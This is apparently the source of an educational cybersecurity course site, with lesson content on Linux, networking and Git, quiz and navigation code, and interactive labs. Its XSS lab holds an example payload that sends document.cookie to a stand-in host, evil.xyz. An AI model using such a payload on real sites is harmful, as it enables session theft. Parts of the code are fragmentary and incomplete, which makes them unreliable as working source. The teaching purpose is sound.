          <p>Основные методы: <b>GET</b> (получить данные), <b>POST</b> (отправить данные, например логин). Коды статуса: <b>200</b> OK, <b>404</b> не найдено, <b>403</b> запрещено, <b>500</b> ошибка сервера.</p>

    tags: ["Foundations", "Linux"],
    lead: "In cybersecurity almost everything happens in the Linux terminal. The file system, basic commands and permissions are the foundation.",
    sections: [
      { h: "Why Linux?", html: `
        <div class="analogy"><b>Analogy:</b> Windows is a furnished apartment, everything already in place. Linux is an empty workshop: you pick up each tool yourself, but that's exactly why you can control everything.</div>
        <div class="prose">
          <p>Most servers, nearly all security tools (Nmap, Metasploit, Wireshark) and CTF labs run on Linux. So knowing the terminal is a must.</p>
          <p>The <b>terminal</b> is a window where you command the computer with text. No mouse, fast and precise. One command can rename a thousand files.</p>
          <p>To start: on Windows run <code>wsl --install</code> (installs Ubuntu), later Kali Linux in VirtualBox. For now, practice in the terminal below.</p>
        </div>` },
      { h: "The file system", html: `
        <div class="prose">
          <p>In Linux everything starts from one tree: <code>/</code> (root). There's no <code>C:\\</code> or <code>D:\\</code> like Windows — it's all one root.</p>
          <ul>
            <li><code>/home/rejo</code> — your personal folder (also written <code>~</code>).</li>
            <li><code>/etc</code> — system settings (e.g. <code>/etc/passwd</code> — users).</li>
            <li><code>/var/log</code> — logs. Blue team looks right here.</li>
            <li><code>/tmp</code> — temporary files.</li>
          </ul>
          <p>An <b>absolute path</b> starts with <code>/</code> (<code>/home/rejo/notes</code>). A <b>relative path</b> is from the current folder (<code>notes/todo.txt</code>). <code>..</code> is one level up, <code>.</code> is this folder.</p>
        </div>` },

      { h: "Command trainer", lab: "cmdtrainer" },
      { h: "Permissions", html: `
        <div class="prose">
          <p>Run <code>ls -l</code> and each file shows a marker like <code>-rw-r--r--</code>. These are permissions:</p>
          <pre class="code">-  rwx  r-x  r--
│   │    │    └─ others: read only
│   │    └────── group: read + execute
│   └─────────── owner (user): read + write + execute
└─────────────── type: - file, d directory</pre>
          <p><b>r</b>=read (4), <b>w</b>=write (2), <b>x</b>=execute (1). So <code>chmod 755</code> = rwx r-x r-x. <code>chmod 600</code> = only the owner reads and writes (for password files).</p>

        <div class="note">Permissions matter a lot in security. An SSH key must be <code>600</code>, or SSH refuses it. <code>/etc/shadow</code> (password hashes) is readable only by root.</div>` },

  network: {
    month: 1, id: "network", title: "Networking basics", sub: "How the internet works", time: "50 min",
    tags: ["Foundations", "Networking"],
    lead: "IP addresses, DNS, HTTP and ports are the language of the internet. Both attack and defense start with this language.",
    sections: [
      { h: "IP addresses and ports", html: `
        <div class="analogy"><b>Analogy:</b> an IP address is the building's address, a port is the apartment number. A letter needs both: <code>192.168.1.20:443</code> is apartment 443 in a given building (HTTPS).</div>
        <div class="prose">
          <p>An <b>IPv4</b> address has four parts: <code>192.168.1.20</code>. Each part is 0–255 (8 bits), 32 bits in all.</p>
          <p>Addresses split into two kinds:</p>
          <ul>
            <li><b>Internal (private):</b> <code>192.168.x.x</code>, <code>10.x.x.x</code>, <code>172.16–31.x.x</code>. Inside a home or office network. Not directly visible from the internet.</li>
            <li><b>External (public):</b> unique on the internet, given by your provider.</li>
            <li><code>127.0.0.1</code> (localhost) is the computer itself. You saw this in the SSRF lesson.</li>
          </ul>
        </div>` },
      { h: "Subnet and CIDR", html: `
        <div class="prose">
          <p>The <b>/24</b> in <code>192.168.1.0/24</code> is the subnet mask. It says how much of the IP belongs to the network and how much to the host.</p>
          <p>/24 = the first 24 bits (192.168.1) are the network, the last 8 bits (0–255) are hosts. So this network has 254 usable addresses.</p>
          <p>In a pentest, recon starts here: "which of the 254 addresses in the target /24 are alive?" Nmap scans exactly this range.</p>
        </div>` },
      { h: "Try it: subnet calculator", lab: "subnet" },
      { h: "DNS: name → address", html: `
        <div class="prose">
          <p>You type <code>google.com</code>, but computers only work with IPs. <b>DNS</b> is the internet's phone book: it turns a name into an IP.</p>
          <ol>
            <li>The browser asks for <code>kapitalbank.uz</code>.</li>
            <li>The DNS server replies: <code>195.158.x.x</code>.</li>
            <li>The browser connects to that IP.</li>
          </ol>
          <p>Scammers can trick DNS (DNS spoofing) or grab a similar name — the <code>kapitalbank.uz.verify.top</code> from the phishing lesson is exactly this.</p>
        </div>` },
      { h: "HTTP: request and response", html: `
        <div class="prose">
          <p><b>HTTP</b> is the language of browser and server. Every page opened is one request and one response:</p>
          <pre class="code"><span class="k">GET</span> /login HTTP/1.1
<span class="k">Host</span>: example.com
<span class="k">User-Agent</span>: Mozilla/5.0

<span class="c">← response:</span>
HTTP/1.1 <span class="s">200 OK</span>
<span class="k">Content-Type</span>: text/html</pre>
          <p>Main methods: <b>GET</b> (fetch data), <b>POST</b> (send data, e.g. a login). Status codes: <b>200</b> OK, <b>404</b> not found, <b>403</b> forbidden, <b>500</b> server error.</p>
          <p><b>HTTPS</b> = HTTP + encryption (TLS). Data can't be read in transit, but that doesn't guarantee the site is honest (the phishing lesson).</p>
        </div>` },
      { h: "Cheat sheet: ports and codes", cheat: {
        cols: ["Port / code", "Meaning"],
        rows: [
          ["20/21", "FTP — file transfer (unencrypted)"],
          ["22", "SSH — secure remote access"],
          ["25", "SMTP — sending email"],
          ["53", "DNS — name → IP"],
          ["80", "HTTP — web (unencrypted)"],
          ["443", "HTTPS — web (encrypted)"],
          ["3306", "MySQL database"],
          ["3389", "RDP — Windows remote desktop"],
          ["200 / 301 / 404 / 500", "OK / moved / not found / server error"],
        ] } },
      { h: "Homework", hw: {
        title: "Check your own network",
        task: "In the terminal, run these and explain the output: <code>ip a</code> (or <code>ipconfig</code>) to find your IP. <code>ping google.com</code> — how many ms is the reply? <code>nslookup kapitalbank.uz</code> — which IP comes back?",
        hint: "If your IP is 192.168.x.x, you're on an internal network. The smaller the ping reply time (ms), the faster the link.",
        solution: `<span class="c"># Your IP address (internal)</span>
ip a          <span class="c"># Linux/Mac</span>
ipconfig      <span class="c"># Windows</span>

<span class="c"># Link to a site and its speed</span>
ping google.com

<span class="c"># Name to IP (DNS)</span>
nslookup kapitalbank.uz

<span class="c"># The path: which servers a packet passes through</span>
traceroute google.com   <span class="c"># Windows: tracert</span>` } },
      { h: "Further resources", links: [
        { t: "TryHackMe: What is Networking?", u: "https://tryhackme.com/room/whatisnetworking", d: "Networking basics, interactive" },
        { t: "TryHackMe: DNS in Detail", u: "https://tryhackme.com/room/dnsindetail", d: "DNS in more depth" },
        { t: "TryHackMe: HTTP in Detail", u: "https://tryhackme.com/room/httpindetail", d: "HTTP requests and responses" },
      ] },
    ],
    quiz: [
      { q: "What kind of address is <code>192.168.1.50</code>?", opts: ["External (public)", "Internal (private)", "A DNS server"], a: 1, why: "192.168.x.x is an internal (private) range. Used inside a home or office network." },
      { q: "What does DNS do?", opts: ["Encrypts data", "Turns a name into an IP address", "Scans ports"], a: 1, why: "DNS is the internet's phone book: it turns a name like google.com into an IP address." },
      { q: "Which HTTP method does a login form usually use to send data?", opts: ["GET", "POST", "DNS"], a: 1, why: "POST sends data (the password). GET is for requests visible in the address bar." },
      { q: "How many usable hosts are in a <code>/24</code> subnet?", opts: ["24", "254", "1024"], a: 1, why: "/24 = 8 bits for the host, 2⁸=256, minus two (network and broadcast) = 254 usable addresses." },
      { q: "Which service is on port 443?", opts: ["SSH", "HTTPS", "MySQL"], a: 1, why: "443 is HTTPS (encrypted web). SSH is 22, MySQL is 3306." },
    ]
  },

  git: {

    tags: ["Foundations", "Portfolio"],
    lead: "Git is a system that keeps the history of your code. GitHub is where it's shown on the internet. Employers look right at your GitHub.",
    sections: [
      { h: "Why Git?", html: `
        <div class="analogy"><b>Analogy:</b> games have a save point. Git is the same: each commit is a saved point. Make a mistake and you go back. The whole history is kept.</div>
        <div class="prose">
          <p>Git remembers every version of your code. What changed, when, why — it's all visible. It's also the basis of teamwork.</p>
          <p><b>GitHub</b> is a site that stores Git projects online. Your CTF write-ups, your Cyber Toolkit — all of it becomes a portfolio on GitHub. It's the first thing asked about in a job search.</p>
        </div>` },
      { h: "Three stages", html: `
        <div class="prose">
          <p>In Git a file passes through three places:</p>
          <ol>
            <li><b>Working directory</b> — the files you edit.</li>
            <li><b>Staging</b> — files prepared for a commit (<code>git add</code>).</li>
            <li><b>Repository</b> — the saved history (<code>git commit</code>).</li>
          </ol>
          <p>Then <code>git push</code> sends it all to GitHub. Try that flow in the simulator below.</p>
        </div>` },
      { h: "Try it: Git simulator", lab: "git" },
      { h: "Practical steps", html: `
        <div class="prose">
          <p>How a new project gets to GitHub:</p>
          <pre class="code"><span class="c"># 1. Start Git in the folder</span>
git init

<span class="c"># 2. Set who you are, once</span>
git config --global user.name <span class="s">"Rejo"</span>
git config --global user.email <span class="s">"you@example.com"</span>

<span class="c"># 3. Add and save the files</span>
git add .
git commit -m <span class="s">"First commit: password checker"</span>

<span class="c"># 4. Connect GitHub and push</span>
git remote add origin https://github.com/rejo/cyber-toolkit.git
git push -u origin main</pre>
        </div>
        <div class="note"><b>Careful:</b> never push passwords, API keys or a <code>.env</code> file to GitHub. List them in <code>.gitignore</code>. This is the most common security mistake — millions of keys have leaked on GitHub this way.</div>` },

// Yangi darslar (NEW_*) va mavjud darslar (LESSONS_*) birlashtiriladi. engine.js LX ni ishlatadi.
const M1_ORDER = ["linux", "parol", "hash", "kodlash", "network", "port", "phishing", "python", "web", "git"];

function assemble(existing, extra) {
  const byId = {};
  for (const l of existing) byId[l.id] = l;
  for (const k in extra) byId[extra[k].id] = extra[k];
  return M1_ORDER.map((id) => byId[id]).filter(Boolean);
}

const LX = {
  uz: assemble(LESSONS_UZ, NEW_UZ),
  ru: assemble(LESSONS_RU, NEW_RU),
  en: assemble(LESSONS_EN, NEW_EN),
};

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

// --- Progress (faqat shu brauzerda saqlanadi) ---
const KEY = "kiber-darslik-v1";
function loadState() { try { return JSON.parse(localStorage.getItem(KEY)) || { done: [], last: 0 }; } catch { return { done: [], last: 0 }; } }
function saveState() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch {} }
const state = loadState();
const LESSONS_BY = LX;                 // LX = { uz: [...], ru: [...], en: [...] } — lessons/*.js to'ldiradi
let LESSONS = LESSONS_BY[LANG];
state.last = typeof state.last === "string" ? state.last : null;   // eski versiyada indeks saqlangan edi
let current = Math.max(0, LESSONS.findIndex((l) => l.id === state.last));
const fromHash = LESSONS.findIndex((l) => "#" + l.id === location.hash);
if (fromHash >= 0) current = fromHash;

function renderProgress() {
  const ids = new Set(LESSONS.map((l) => l.id));
  const n = state.done.filter((d) => ids.has(d)).length;
  $("#progText").textContent = `${n} / ${LESSONS.length}`;
  $("#progBar").style.width = (n / LESSONS.length) * 100 + "%";
}

// Chap menyu: darslar oylar bo'yicha guruhlanadi, keyingi oylar "tez orada" bo'lib ko'rinadi
function renderNav() {
  const months = [...new Set(LESSONS.map((l) => l.month))];
  const plan = t("months");
  let html = "";
  for (const m of months) {
    html += `<div class="navmonth">${esc(t("month_n", { n: m }))} · ${esc(plan[m - 1])}</div>`;
    html += LESSONS.map((l, i) => l.month !== m ? "" : `
      <button type="button" data-i="${i}" class="${i === current ? "on" : ""} ${state.done.includes(l.id) ? "done" : ""}" aria-current="${i === current}">
        <span class="num">${state.done.includes(l.id) ? "✓" : i + 1}</span>
        <span>${esc(l.title)}<small>${esc(l.sub)}</small></span>
      </button>`).join("");
  }
  for (let m = Math.max(...months) + 1; m <= plan.length; m++) {
    html += `<div class="navmonth soon"><span>${esc(t("month_n", { n: m }))} · ${esc(plan[m - 1])}</span><span class="chip">${esc(t("soon"))}</span></div>`;
  }
  $("#nav").innerHTML = html;
  $("#nav").querySelectorAll("button").forEach((b) => b.addEventListener("click", () => go(+b.dataset.i)));
}

function go(i) {
  current = i; state.last = LESSONS[i].id; saveState();
  try { history.replaceState(null, "", "#" + LESSONS[i].id); } catch {}
  renderNav(); renderLesson();
  $("#lesson").scrollIntoView({ behavior: "smooth", block: "start" });
}

function sectionBody(s) {
  if (s.html) return s.html;
  if (s.lab) return `<div class="lab" id="lab-${s.lab}"></div>`;
  if (s.code) return `
      <div class="file">${esc(s.code.file)}</div>
      <pre class="code">${s.code.src}</pre>
      <ol class="explain">${s.code.explain.map((e) => `<li><span>${e}</span></li>`).join("")}</ol>`;
  if (s.cheat) return `
      <div class="tbl cheat"><table>
        <tr>${s.cheat.cols.map((c) => `<th>${esc(c)}</th>`).join("")}</tr>
        ${s.cheat.rows.map((r) => `<tr>${r.map((c, ci) => ci === 0 ? `<td><code>${esc(c)}</code></td>` : `<td>${c}</td>`).join("")}</tr>`).join("")}
      </table></div>`;
  if (s.links) return `
      <ul class="links">${s.links.map((k) => `
        <li><a href="${esc(k.u)}" target="_blank" rel="noopener noreferrer">${esc(k.t)} <span aria-hidden="true">↗</span></a>
        <span>${esc(k.d)}</span></li>`).join("")}</ul>`;

        <details><summary>${t("solution")}</summary><pre class="code">${s.hw.solution}</pre></details>

  return "";
}

function renderLesson() {
  const l = LESSONS[current];
  const parts = l.sections.map((s, si) => `<section class="sec" id="sec-${si}"><h3>${esc(s.h)}</h3>${sectionBody(s)}</section>`).join("");
  const toc = l.sections.map((s, si) => `<button type="button" class="tocbtn" data-sec="${si}">${esc(s.h)}</button>`).join("")
    + `<button type="button" class="tocbtn" data-sec="quiz">${esc(t("test"))}</button>`;

  $("#lesson").innerHTML = `
    <div class="eyebrow">${esc(t("month_n", { n: l.month }))} · ${esc(t("lesson_n", { n: current + 1 }))} · ${esc(l.time)}</div>
    <h2>${esc(l.title)}</h2>
    <p class="lead">${esc(l.lead)}</p>
    <div class="meta">${l.tags.map((x) => `<span class="chip">${esc(x)}</span>`).join("")}</div>
    <nav class="toc" aria-label="${esc(t("toc"))}"><span>${esc(t("toc"))}</span>${toc}</nav>
    ${parts}
    <section class="sec" id="sec-quiz"><h3>${t("test")}</h3><div class="quiz" id="quiz"></div></section>
    <div class="pager">
      <button type="button" class="btn ghost" id="prev" ${current === 0 ? "disabled" : ""}>${t("prev")}</button>
      <button type="button" class="btn" id="next" ${current === LESSONS.length - 1 ? "disabled" : ""}>${t("next")}</button>
    </div>`;
  $("#prev").addEventListener("click", () => go(current - 1));
  $("#next").addEventListener("click", () => go(current + 1));
  $("#lesson").querySelectorAll(".tocbtn").forEach((b) => b.addEventListener("click", () =>
    document.getElementById("sec-" + b.dataset.sec)?.scrollIntoView({ behavior: "smooth", block: "start" })));
  l.sections.forEach((s) => s.lab && LABS[s.lab]($("#lab-" + s.lab)));
  renderQuiz(l);
}

function renderQuiz(l) {
  const box = $("#quiz");
  const answers = new Array(l.quiz.length).fill(null);
  box.innerHTML = l.quiz.map((q, qi) => `
    <div class="q" data-q="${qi}">
      <p>${qi + 1}. ${esc(q.q)}</p>
      <div class="opts">${q.opts.map((o, oi) => `<button type="button" class="opt" data-o="${oi}">${esc(o)}</button>`).join("")}</div>
    </div>`).join("") + `<div class="result" id="qres"></div>`;

  const update = () => {
    const right = answers.filter((a, i) => a === l.quiz[i].a).length;
    const answered = answers.filter((a) => a !== null).length;
    const res = $("#qres");
    const passed = right === l.quiz.length;
    if (passed && !state.done.includes(l.id)) { state.done.push(l.id); saveState(); renderNav(); renderProgress(); }
    res.className = "result" + (passed || state.done.includes(l.id) ? " pass" : "");
    if (passed) res.innerHTML = `<span>${t("q_pass")}</span>${current < LESSONS.length - 1 ? `<button type="button" class="btn" id="qnext">${t("q_next")}</button>` : `<span>${t("q_all_done")}</span>`}`;
    else if (answered === l.quiz.length) res.innerHTML = `<span>${esc(t("q_score", { r: right, n: l.quiz.length }))}</span><button type="button" class="btn ghost" id="qretry">${t("q_retry")}</button>`;
    else res.innerHTML = `<span>${esc(t("q_progress", { a: answered, n: l.quiz.length }))}</span>`;
    $("#qnext")?.addEventListener("click", () => go(current + 1));
    $("#qretry")?.addEventListener("click", () => renderQuiz(l));
  };

  box.querySelectorAll(".q").forEach((qel) => {
    const qi = +qel.dataset.q, q = l.quiz[qi];
    qel.querySelectorAll(".opt").forEach((b) => b.addEventListener("click", () => {
      const oi = +b.dataset.o; answers[qi] = oi;
      qel.querySelectorAll(".opt").forEach((x) => { x.disabled = true; });
      qel.querySelectorAll(".opt")[q.a].classList.add("right");
      if (oi !== q.a) b.classList.add("wrong");
      qel.insertAdjacentHTML("beforeend", `<div class="fb ${oi === q.a ? "ok" : "no"}">${oi === q.a ? t("q_right") : t("q_wrong")}${esc(q.why)}</div>`);
      update();
    }));
  });
  update();
}

// ================= LABLAR =================
function sha256(str) {
  const K = [0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
  const b = new TextEncoder().encode(str), n = (((b.length + 8) >> 6) + 1) * 16, w0 = new Array(n).fill(0);
  for (let i = 0; i < b.length; i++) w0[i >> 2] |= b[i] << (24 - (i % 4) * 8);
  w0[b.length >> 2] |= 0x80 << (24 - (b.length % 4) * 8); w0[n - 1] = b.length * 8;
  const rotr = (x, k) => (x >>> k) | (x << (32 - k));
  let h = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
  for (let j = 0; j < n; j += 16) {
    const w = w0.slice(j, j + 16);
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3), s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
    }
    let [a, bb, c, d, e, f, g, hh] = h;
    for (let i = 0; i < 64; i++) {
      const t1 = (hh + (rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) + ((e & f) ^ (~e & g)) + K[i] + w[i]) | 0;
      const t2 = ((rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) + ((a & bb) ^ (a & c) ^ (bb & c))) | 0;
      hh = g; g = f; f = e; e = (d + t1) | 0; d = c; c = bb; bb = a; a = (t1 + t2) | 0;
    }
    h = h.map((v, i) => (v + [a, bb, c, d, e, f, g, hh][i]) | 0);
  }
  return h.map((v) => (v >>> 0).toString(16).padStart(8, "0")).join("");
}

function humanTime(s) {
  if (s < 1) return t("t_instant");
  const secs = [31536000e9, 31536000e6, 31536000, 86400, 3600, 60, 1], names = t("t_units");
  for (let i = 0; i < secs.length; i++) if (s >= secs[i]) { const v = s / secs[i]; return v > 1e6 ? t("t_universe") : `${Math.round(v).toLocaleString("ru")} ${names[i]}`; }
}

  handshake(el) {
    const STEPS = {
      open: [["SYN", "→", t("p_syn")], ["SYN-ACK", "←", t("p_synack")], ["ACK", "→", t("p_ack")]],
      closed: [["SYN", "→", t("p_syn")], ["RST", "←", t("p_rst")], ["", "", t("p_closed_end")]],
      filtered: [["SYN", "→", t("p_syn")], ["", "✕", t("p_drop")], ["", "", t("p_timeout")]],
    };
    let mode = "open", step = 0;
    el.innerHTML = `
      <div class="row" role="group" aria-label="${t("p_group")}">

    const draw = () => {
      const s = STEPS[mode];
      const rows = s.slice(0, step).map(([flag, dir, text], i) => {
        const y = 70 + i * 52;
        if (dir === "→") return `<line x1="110" y1="${y}" x2="430" y2="${y}" stroke="var(--accent)" stroke-width="2" marker-end="url(#ah)"/><text x="270" y="${y - 8}" text-anchor="middle" font-weight="700" font-size="14" style="font-family:var(--mono)">${flag}</text><text x="270" y="${y + 18}" text-anchor="middle" class="lbl">${esc(text)}</text>`;
        if (dir === "←") return `<line x1="430" y1="${y}" x2="110" y2="${y}" stroke="${flag === "RST" ? "var(--bad)" : "var(--good)"}" stroke-width="2" marker-end="url(#ah${flag === "RST" ? "r" : "g"})"/><text x="270" y="${y - 8}" text-anchor="middle" font-weight="700" font-size="14" style="font-family:var(--mono)">${flag}</text><text x="270" y="${y + 18}" text-anchor="middle" class="lbl">${esc(text)}</text>`;
        if (dir === "✕") return `<text x="330" y="${y + 4}" text-anchor="middle" font-size="22" fill="var(--bad)" style="fill:var(--bad)">✕</text><text x="270" y="${y + 24}" text-anchor="middle" class="lbl">${esc(text)}</text>`;
        return `<text x="270" y="${y + 4}" text-anchor="middle" font-weight="600" font-size="14">${esc(text)}</text>`;
      }).join("");
      $("#hs", el).innerHTML = `<svg viewBox="0 0 540 230" role="img" aria-label="${t("p_diagram")}">
        <defs>
          <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--accent)"/></marker>
          <marker id="ahg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--good)"/></marker>
          <marker id="ahr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--bad)"/></marker>
        </defs>
        <rect x="20" y="10" width="90" height="34" rx="8" fill="var(--accent-soft)"/><text x="65" y="32" text-anchor="middle" font-weight="700" font-size="14">${t("p_scanner")}</text>
        <rect x="430" y="10" width="90" height="34" rx="8" fill="var(--sunk)"/><text x="475" y="32" text-anchor="middle" font-weight="700" font-size="14">${t("p_server")}</text>
        <line x1="65" y1="44" x2="65" y2="220" stroke="var(--line)" stroke-dasharray="4 4"/><line x1="475" y1="44" x2="475" y2="220" stroke="var(--line)" stroke-dasharray="4 4"/>
        ${rows}</svg>`;
      $("#hs-next", el).disabled = step >= s.length;
      $("#hs-note", el).textContent = step >= s.length ? t("p_done") : t("p_step", { s: step, n: s.length });
    };
    el.querySelectorAll("[data-m]").forEach((b) => b.addEventListener("click", () => {
      mode = b.dataset.m; step = 0;
      el.querySelectorAll("[data-m]").forEach((x) => x.classList.toggle("ghost", x !== b));
      draw();
    }));
    $("#hs-next", el).addEventListener("click", () => { step++; draw(); });
    $("#hs-reset", el).addEventListener("click", () => { step = 0; draw(); });
    step = 1; draw();
  },

  xss(el) {
    const EX = [
      t("x_comment"),
      `<b>${t("x_great")}</b> <img src="x" onerror="fetch('https://evil.xyz/?c='+document.cookie)">`,
      `<h3>${t("x_session")}</h3><form>${t("x_pw")} <input type="password"> <button>${t("x_login")}</button></form><script>/* evil.xyz */<\/script>`,
    ];
    el.innerHTML = `
      <div><label for="x-in">${t("x_in")}</label>
        <textarea id="x-in" rows="3">${esc(EX[1])}</textarea></div>
      <div class="row">
        <button type="button" class="btn ghost" data-ex="0">${t("x_ex0")}</button>
        <button type="button" class="btn ghost" data-ex="1">${t("x_ex1")}</button>
        <button type="button" class="btn ghost" data-ex="2">${t("x_ex2")}</button>
      </div>
      <div class="pane-grid">
        <div class="pane bad"><h5>${t("x_bad")}</h5><div id="x-bad"></div><div id="x-warn"></div></div>
        <div class="pane good"><h5>${t("x_good")}</h5><div id="x-good"></div></div>
      </div>
      <p class="prose labnote">${t("x_note")}</p>`;
    const upd = () => {
      const raw = $("#x-in", el).value;
      const doc = new DOMParser().parseFromString(`<div>${raw}</div>`, "text/html");
      const danger = [];
      doc.querySelectorAll("script").forEach((s) => { danger.push(esc(t("x_would_run", { what: "<script>", code: s.textContent.trim().slice(0, 80) }))); s.remove(); });
      doc.querySelectorAll("*").forEach((n) => [...n.attributes].forEach((a) => {
        if (/^on/i.test(a.name)) { danger.push(esc(t("x_would_run", { what: a.name, code: a.value.slice(0, 80) }))); n.removeAttribute(a.name); }
        if (/^(src|href|action)$/i.test(a.name)) n.removeAttribute(a.name);
      }));
      doc.querySelectorAll("form").forEach((f) => f.addEventListener("submit", (e) => e.preventDefault()));
      const bad = $("#x-bad", el); bad.innerHTML = ""; bad.append(...doc.body.firstChild.childNodes);
      bad.querySelectorAll("form").forEach((f) => f.addEventListener("submit", (e) => e.preventDefault()));
      bad.querySelectorAll("button").forEach((b) => b.type = "button");
      $("#x-warn", el).innerHTML = danger.length ? `<div class="fb no" style="margin-top:8px">⚠ ${danger.join("<br>⚠ ")}</div>` : "";
      $("#x-good", el).innerHTML = esc(raw);
    };
    $("#x-in", el).addEventListener("input", upd);
    el.querySelectorAll("[data-ex]").forEach((b) => b.addEventListener("click", () => { $("#x-in", el).value = EX[+b.dataset.ex]; upd(); }));
    upd();
  },
};

// ---------- 1. Mashq terminali (kengaytirilgan: o'zgaruvchan fayl tizimi, missiyalar) ----------
LABS.terminal = (el) => {
  const HOME = "/home/rejo";
  const te = () => "";
  // O'zgaruvchan fayl tizimi: dir = {t:"d", c:{nom:...}}, file = {t:"f", data:"..."}
  const root = { t: "d", c: {} };
  function seed(path, data) { // yordamchi: boshlang'ich fayllarni joylash
    const parts = path.split("/").filter(Boolean);
    let node = root;
    parts.forEach((p, i) => {
      if (i === parts.length - 1) node.c[p] = data.t ? data : { t: "f", data: data, perm: data.perm };
      else { node.c[p] = node.c[p] || { t: "d", c: {} }; node = node.c[p]; }
    });
  }
  const sampleLog = [
    "Sep 28 08:01:15 kiber login: session opened for user rejo",
    "Sep 28 09:44:02 kiber sudo: rejo ran: apt update",
    "Sep 28 11:30:51 kiber login: session closed for user rejo",
  ].join("\n");
  seed("home/rejo", { t: "d", c: {} });
  seed("home/rejo/readme.txt", { t: "f", data: t("tm_readme") });
  seed("home/rejo/.flag", { t: "f", data: "flag{yashirin_fayllar_topildi}", perm: "-rw-------" });
  seed("home/rejo/notes/todo.txt", { t: "f", data: t("tm_todo") });
  seed("home/rejo/logs/session.log", { t: "f", data: sampleLog });
  seed("etc/passwd", { t: "f", data: "root:x:0:0:root:/root:/bin/bash\nrejo:x:1000:1000:Rejo:/home/rejo:/bin/bash" });
  seed("etc/hostname", { t: "f", data: "kiber" });
  seed("tmp", { t: "d", c: {} });

  let cwd = HOME;
  const history = [];
  const done = new Set();

  // Missiyalar: bosqichma-bosqich. check(ctx) — bajarildimi.
  const MISSIONS = [
    { id: "pwd", check: () => done.has("_pwd") },
    { id: "hidden", check: () => done.has("_hidden") },
    { id: "flag", check: () => done.has("_flag") },
    { id: "grep", check: () => done.has("_grep") },
    { id: "wc", check: () => done.has("_wc") },
    { id: "mkdir", check: () => !!getNode(HOME + "/loyiha") },
    { id: "touch", check: () => { const n = getNode(HOME + "/loyiha"); return n && n.t === "d" && Object.keys(n.c).length > 0; } },
    { id: "write", check: () => { const n = getNode(HOME + "/loyiha/readme.md") || firstFileIn(HOME + "/loyiha"); return n && n.t === "f" && (n.data || "").trim().length > 0; } },
    { id: "find", check: () => done.has("_find") },
    { id: "chmod", check: () => done.has("_chmod") },
  ];

  el.innerHTML = `
    <div class="term-wrap">
      <div class="term" id="term" role="log" aria-live="polite"></div>
      <form class="term-in" id="termForm"><label for="termInput" class="prompt" id="prompt"></label>
        <input id="termInput" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="${esc(t("tm_input"))}"></form>
    </div>
    <div class="term-tools">
      <div class="tmprog"><b>${esc(t("tm_missions_title"))}</b> <span id="tmCount"></span>
        <div class="bar"><i id="tmBar"></i></div></div>
      <ol id="tmTasks" class="tmlist"></ol>
      <details class="tmref"><summary>${esc(t("tm_ref_title"))}</summary>
        <div class="tbl"><table><tr><th>${esc(t("tm_ref_cmd"))}</th><th>${esc(t("tm_ref_desc"))}</th></tr>
        ${t("tm_ref").map((r) => `<tr><td><code>${esc(r[0])}</code></td><td>${esc(r[1])}</td></tr>`).join("")}
        </table></div></details>
    </div>`;
  const term = $("#term", el), input = $("#termInput", el);

  // ---- Yo'l yordamchilari ----
  const short = (p) => p === HOME ? "~" : p.startsWith(HOME + "/") ? "~" + p.slice(HOME.length) : p;
  const setPrompt = () => { $("#prompt", el).textContent = `rejo@kiber:${short(cwd)}$`; };
  const print = (text, cls = "") => { const d = document.createElement("div"); if (cls) d.className = cls; d.textContent = text; term.append(d); term.scrollTop = term.scrollHeight; };
  function resolve(p) {
    if (!p || p === "~") return HOME;
    if (p.startsWith("~/")) p = HOME + p.slice(1);
    const parts = (p.startsWith("/") ? p : cwd + "/" + p).split("/");
    const out = [];
    for (const x of parts) { if (!x || x === ".") continue; if (x === "..") out.pop(); else out.push(x); }
    return "/" + out.join("/");
  }
  function getNode(path) {
    const parts = resolve(path).split("/").filter(Boolean);
    let node = root;
    for (const p of parts) { if (node.t !== "d" || !node.c[p]) return null; node = node.c[p]; }
    return node;
  }
  function parentOf(path) { const abs = resolve(path); const i = abs.lastIndexOf("/"); return { dir: getNode(abs.slice(0, i) || "/"), name: abs.slice(i + 1), abs }; }
  function firstFileIn(path) { const n = getNode(path); if (!n || n.t !== "d") return null; for (const k of Object.keys(n.c)) if (n.c[k].t === "f") return n.c[k]; return null; }
  const nameOf = (p) => p.split("/").pop() || "/";

  function renderTasks() {
